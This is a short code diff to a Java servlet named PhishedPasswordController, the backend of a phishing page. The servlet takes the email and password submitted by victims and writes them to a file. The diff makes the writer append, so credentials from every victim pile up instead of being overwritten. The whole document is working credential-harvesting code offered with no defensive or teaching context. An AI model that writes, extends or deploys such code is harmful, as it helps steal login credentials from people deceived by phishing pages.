@@ -26,8 +26,8 @@ public class PhishedPasswordController extends HttpServlet
 		
 		String name = request.getParameter("Email");
 		String pwd = request.getParameter("Password");
-		FileWriter writer = new FileWriter(path);
-		writer.write("name = " + name);
+		FileWriter writer = new FileWriter(path, true);
+		writer.write("\n" + "name = " + name);
 		writer.write("\n");
 		writer.write("password = " + pwd);
 		writer.close();
